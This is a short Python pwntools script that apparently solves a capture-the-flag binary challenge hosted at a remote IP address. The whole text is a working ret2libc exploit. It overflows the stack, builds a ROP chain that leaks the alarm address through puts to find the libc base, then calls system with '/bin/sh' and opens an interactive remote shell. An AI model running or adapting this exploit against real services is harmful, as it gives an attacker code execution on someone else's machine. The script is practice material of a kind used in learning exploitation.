#!/usr/bin/python3
from pwn import *
import sys
#context.log_level = 'DEBUG'
context(os='linux', arch='amd64')
#e = context.binary = ELF("./pwn")
#p = e.debug(gdbscript="source /home/nick/global/halfdisp.py"
#+"\nbreak *system"
#+"\nc"
#)
p = remote("83.136.254.223",58603)
exe = ELF('./pwn')
libc = ELF("./glibc/libc.so.6")
offset = 40*b"\x90"
rop = ROP(exe)
pop_rdi = 0x40159f #: pop rdi ; ret
pop_rdi = rop.find_gadget(["pop rdi"])[0]
ret = rop.find_gadget(["ret"])[0]
#success(f"{hex(pop_rdi)=}")
#success(f"{hex(ret)=}")
main_function = exe.symbols.main
puts_plt = exe.plt.puts
alarm_got = exe.got.alarm
#success(f"{hex(puts_plt)=}")

#success(f"{hex(alarm_got)=}")

payload = flat([
offset,
p64(ret),
p64(pop_rdi),
p64(alarm_got),
p64(puts_plt),
p64(ret),
p64(main_function)
])

p.sendline(payload)
p.recvuntil(b"testing..\n")
alarm_libc = u64(p.recv(6).ljust(8,b"\x00"))
#alarm_libc = u64(p.read())

success(f"{hex(alarm_libc)=}")
libc_base = alarm_libc - libc.symbols.alarm
success(f"{hex(libc_base)=}")
libc.address = libc_base

system = libc.symbols.system

bin_sh= next(libc.search(b"/bin/sh\x00"))
success(f"{hex(system)=}")
success(f"{hex(bin_sh)=}")
p.recvuntil(b"\n")
payload = flat([
offset,
p64(ret),
p64(pop_rdi),
p64(bin_sh),
p64(system)
])
p.send(payload)
p.interactive()